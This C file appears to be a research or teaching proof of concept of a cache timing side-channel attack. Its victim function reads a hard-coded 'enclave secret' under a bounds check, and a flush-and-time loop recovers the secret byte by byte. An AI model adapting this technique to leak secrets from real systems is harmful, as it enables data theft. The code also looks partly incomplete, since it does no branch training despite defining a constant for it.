#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define NUM_TRAIN 6
#define NUM_ROUNDS 1
#define SAME_ATTACK_ROUNDS 10
#define SECRET_LEN 85
#define CACHE_THRESHOLD 50

uint64_t array1_size = 16;
uint8_t padding1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t padding2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* enclave_secret = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

/**
 * Trova i due indici con i valori più alti in un array.
 */
void findTopTwo(uint64_t* inputArray, uint64_t inputSize, uint8_t* outputIdxArray, uint64_t* outputValArray) {
    outputValArray[0] = 0;
    outputValArray[1] = 0;

    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0];
            outputValArray[0] = inputArray[i];
            outputIdxArray[1] = outputIdxArray[0];
            outputIdxArray[0] = i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i];
            outputIdxArray[1] = i;
        }
    }
}

/**
 * Funzione vittima che simula un fault nell'accesso a dati sensibili.
 */
void victimFunction(uint64_t idx) {
    uint8_t temp = 0;

    // Accesso speculativo a un indirizzo protetto nell'enclave
    if (idx < array1_size) {
        // Simulazione dell’accesso che causa un fault speculativo
        temp = *((volatile uint8_t*)(enclave_secret + idx));
        // Usa temp per causare un carico nella cache
        array2[temp * L1_BLOCK_SZ_BYTES] += 1;
    }
}

int main(void) {
    uint64_t attackIdx = 0; 
    uint64_t startTime, duration, inputIdx;
    uint8_t temp = 0;
    static uint64_t results[256];

    // Inizializza array2
    for (uint64_t i = 0; i < sizeof(array2); ++i) {
        array2[i] = 0;
    }

    // Inizio dell'estrazione del segreto simulando il fault
    for(uint64_t i = 0; i < SECRET_LEN; ++i) {

        // Reset dei risultati
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        // Ripeti l'attacco
        for(uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {

            // Flush della cache per array2
            flushCache((uint64_t)array2, sizeof(array2));

            // Richiama la funzione vittima simulando un fault
            victimFunction(i);

            // Misura i tempi di accesso per array2
            for (uint64_t m = 0; m < 256; ++m) {
                startTime = rdcycle();
                temp = array2[m * L1_BLOCK_SZ_BYTES];
                duration = (rdcycle() - startTime);

                if (duration < CACHE_THRESHOLD) {
                    results[m] += 1;
                }
            }
        }

        // Trova i due migliori risultati
        uint8_t bestGuess[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuess, bestHits);

        printf("Byte %lu: expected(%c) =?= guess(hits, dec, char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", 
            i, enclave_secret[i], bestHits[0], bestGuess[0], bestGuess[0], 
            bestHits[1], bestGuess[1], bestGuess[1]); 
    }

    return 0;
}
